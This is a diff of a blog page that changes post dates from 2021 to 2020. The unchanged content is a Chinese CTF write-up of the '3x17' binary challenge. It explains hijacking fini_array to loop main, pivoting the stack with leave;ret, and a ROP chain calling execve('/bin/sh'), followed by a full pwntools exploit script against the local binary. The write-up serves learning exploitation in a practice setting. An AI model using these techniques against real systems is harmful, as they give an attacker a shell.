@@ -98,7 +98,7 @@
     <v-divider></v-divider>
     
         <div class="post-toc">
-            <a href="/2021/12/23/Classic/3x17/" class="toc-header">Table of Contents</a>
+            <a href="/2020/12/23/Classic/3x17/" class="toc-header">Table of Contents</a>
             <div class="toc-content">
                 <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#3x17"><span class="toc-number">1.</span> <span class="toc-text">3x17</span></a></li></ol>
             </div>
@@ -197,11 +197,11 @@
     
     
         <div class="post-header">
-  <a class="post-header-title font-weight-medium" href="/2021/12/23/Classic/3x17/">3x17</a>
+  <a class="post-header-title font-weight-medium" href="/2020/12/23/Classic/3x17/">3x17</a>
   <div class="post-header-meta">   
     <span>
       <v-icon color="">event</v-icon>
-      Posted on:&nbsp;2021-12-23
+      Posted on:&nbsp;2020-12-23
     </span>
     <span>
       <v-icon color="">event_available</v-icon>
@@ -233,7 +233,7 @@
 <p>程序从启动到结束时，会从_start开始，依次执行__libc_csu_init，main，__libc_csu_fini函数。llibc_csu会依次执行init(fini)_array数组中的指令。顺序如下。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__libc_csu_init-&gt;init_array[<span class="number">0</span>]-&gt;init_array[<span class="number">1</span>]-&gt;...-&gt;init_array[n]</span><br><span class="line">main</span><br><span class="line">__libc_csu_fini-&gt;fini_array[n]-&gt;fini_array[n<span class="number">-1</span>]-&gt;...-&gt;fini_array[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
 <p>如果将fini_array[1]覆盖为main，fini_array[0]覆盖为__libc_csu_fini函数，则可以实现无限循环运行main函数。之后布置rop，利用栈迁移getshell。这题因为改了fini_array，在不断的循环中，栈地址也被不断抬高，栈布局也变得十分有规律</p>
-<p><img src="/2021/12/23/Classic/3x17/Users\dell\AppData\Roaming\Typora\typora-user-images\image-20201223193813250.png" alt="image-20201223193813250"></p>
+<p><img src="/2020/12/23/Classic/3x17/Users\dell\AppData\Roaming\Typora\typora-user-images\image-20201223193813250.png" alt="image-20201223193813250"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">此时若执行leave,相当于</span></span><br><span class="line">rsp = rbp</span><br><span class="line">rbp = 0x4b40f0</span><br><span class="line">rsp = rsp-0x8</span><br><span class="line"><span class="meta">#</span><span class="bash">再执行ret时，程序会返回到0x40298c(libc_csu_fini内部)，再次重新调用libc_csu_fini，然后调用<span class="comment">#main函数。但倘若将fini_array[0]-&gt;leave ret，则会发生</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">leave</span></span><br><span class="line">rsp = rbp = 0x4b40f0</span><br><span class="line">rbp = ?</span><br><span class="line">rsp = rsp+0x8 = 0x4b40f8</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ret</span></span><br><span class="line">rsp = rsp+0x8 = 0x4b4100</span><br><span class="line"><span class="meta">#</span><span class="bash">所以要把rop链布置在0x4b4100上</span></span><br></pre></td></tr></table></figure>
 <p>代码：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;open-wsl.exe&quot;</span>,<span class="string">&quot;-e&quot;</span>]</span><br><span class="line">file = <span class="string">&quot;./3x17&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">addr,value</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;addr:&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(addr))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;data:&quot;</span>)</span><br><span class="line">    p.send(value)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop_exec64</span>(<span class="params">elf,bin_sh</span>):</span></span><br><span class="line">    rop = ROP(elf)</span><br><span class="line">    rop.raw(rop.rax)</span><br><span class="line">    rop.raw(<span class="number">59</span>)</span><br><span class="line">    rop.raw(rop.rdi)</span><br><span class="line">    rop.raw(bin_sh)</span><br><span class="line">    rop.raw(rop.rsi)</span><br><span class="line">    rop.raw(<span class="number">0</span>)</span><br><span class="line">    rop.raw(rop.rdx)</span><br><span class="line">    rop.raw(<span class="number">0</span>)</span><br><span class="line">    rop.raw(rop.syscall[<span class="number">1</span>])</span><br><span class="line">    payload = rop.chain()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">fini_0 = <span class="number">0x4B40F0</span></span><br><span class="line">libc_csu_fini = <span class="number">0x402960</span></span><br><span class="line">main = <span class="number">0x401B6D</span></span><br><span class="line">bin_sh = <span class="number">0x4B9300</span></span><br><span class="line">rop_address = <span class="number">0x4B4100</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x401C4B</span></span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">write(fini_0,p64(libc_csu_fini)+p64(main))</span><br><span class="line">write(bin_sh,p64(s2n(<span class="string">&quot;/bin/sh&quot;</span>[::-<span class="number">1</span>])))</span><br><span class="line"></span><br><span class="line">payload = rop_exec64(file,bin_sh)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload),<span class="number">8</span>):</span><br><span class="line">    write(rop_address+i,payload[i:i+<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">write(fini_0,p64(leave_ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -251,15 +251,15 @@
         
             <div class="post-nav-button float-left">
                 <v-icon>chevron_left</v-icon>
-                <a class="font-weight-bold text-left" href="/2021/12/24/Classic/hacknote/">
+                <a class="font-weight-bold text-left" href="/2020/12/24/Classic/hacknote/">
                     hacknote
                 </a>
             </div>
               
           
             <div class="post-nav-button float-right">
-                <a class="font-weight-bold text-right" href="/2021/01/24/Classic/applestore/">      
-                    applestore
+                <a class="font-weight-bold text-right" href="/2020/11/22/Game/%E7%A5%A5%E4%BA%91%E6%9D%AF/">      
+                    2020 祥云杯
                 </a>
                 <v-icon>chevron_right</v-icon>
             </div>
